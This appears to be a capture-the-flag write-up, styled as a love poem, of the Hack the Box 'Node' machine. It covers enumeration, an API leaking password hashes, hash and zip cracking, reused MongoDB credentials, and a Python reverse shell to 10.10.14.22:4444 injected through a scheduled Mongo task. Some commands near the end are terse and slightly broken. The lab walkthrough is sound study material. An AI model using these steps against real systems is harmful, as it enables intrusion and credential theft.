---
layout: post
title:  "Hack the Box - Node"
date:   2018-03-07 16:16:01 -0600
categories: hackthebox nosql webapp reversing mongo mongodb hacking writeup
---

<img class="header-img" src="{{ "img/node/home.png" | relative_url }}" />

Node was a special box to me. It was a special box because it was my first "first blood", and it got me truely addicted to (https://hackthebox.eu)[hackthebox]. In light of this, I'm going mix things up and bit and make the following writeup a love note to Node:

Oh, Node,
it has been some time since we last spoke.
It's been a while since my sweet TCP packets,
probed your open ports.

{% highlight shell %}
root@hack ~# nmap -p- -T4 node.htb
{% endhighlight %}

You rebuffed my attempts on 80. On 8080, 443, and more.
But you invited me into your space, into yourplace, into port 3000.
Yes, you did.

I dug into your deepest secrets.
And into the APIs which b(urp)equeathed your user sequence.
I saw you clearly, inside and out; cut through your defences:
turned `/api/users/latest` to `/api/users` and saw your sweet response:

{% highlight shell %}
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 611
ETag: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"
Date: Wed, 07 Mar 2018 13:51:16 GMT
Connection: close

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
{% endhighlight %}

You past lovers? I cared not.
But an `admin` flag, is an `admin` flag, and must always be followed. Its hash looked weak.
Indeed, it was. (https://crackstation.net)["manchester"].

With each keystroke, we grew closer
m.y.P.1.4.c.e.A.d.m.1.n.A.c.c.0.u.N.T.
m.a.n.c.h.e.s.t.e.r.

You offered me your memories, encoded in mystery. I was undeterred.

{% highlight shell %}
root@hack ~/Downloads# base64 -d myplace.backup > myplace.what
root@hack ~/Downloads# file myplace.what
myplace.what: Zip archive data, at least v1.0 to extract
{% endhighlight %}

But still, you resisted me.

{% highlight shell %}
root@hack ~/Downloads# unzip myplace.what
Archive:  myplace.what
  creating: var/www/myplace
[myplace.what] var/www/myplace/package-lock.json password:
{% endhighlight %}

{% highlight shell %}
root@hack ~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.what


PASSWORD FOUND!!!!: pw == magicword
root@hack ~/Downloads# unzip -P magicword myplace.what
rock@hack ~/Downloads# head -n 11 var/www/myplace/app.js | tail -n 1
const url        = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
{% endhighlight %}

Who was this `mark`?" I wondered. What boundries had you let him pass?
Nevermind. I had his secret, and he made a mistake, leaving this behind.

{% highlight shell %}
root@hack ~# ssh mark@node.htb
mark@node ~$
{% endhighlight %}

Node, my sweet Node, I felt so close to you. We were separated by miles and miles, but I could feel your circuits responding to my touch.


ps aux
tom running mongo app

/var/scheduler/app.js > runs mongo tasks

mark@node ~$ cat << EOM > /tmp/over.py
> import socket,subprocess,os
> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
> s.connect(('10.10.14.22',4444))
> os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
> p=subprocess.call(['/bin/sh','-i']
EOM

mongo
db.auth("mark","5AYRft73VtFpc84k")
db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})

nc -lvvvp 4444

cat /home/tom/user.txt

And I tasted your sweet blood.

reverse backup to see that it blacklists characters and needs a key
run from / and backup /root
get key
win

your dearest,
overcast


_fin_
